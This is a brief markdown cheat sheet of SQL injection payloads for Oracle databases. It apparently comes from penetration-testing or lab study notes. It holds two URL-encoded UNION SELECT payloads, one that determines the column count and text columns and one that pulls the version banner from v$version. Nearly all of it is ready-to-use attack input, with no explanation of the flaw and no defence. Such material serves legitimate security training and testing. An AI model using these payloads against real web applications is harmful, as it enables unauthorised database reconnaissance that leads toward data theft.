# SQL Injection Payloads

**Oracle database type and version information**
  - Determine the number of columns being returned by the query and which columns contain text data.
```SQL
'+UNION+SELECT+'abc','def'+FROM+dual--
```
  - Display the database version information
```SQL
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```
---
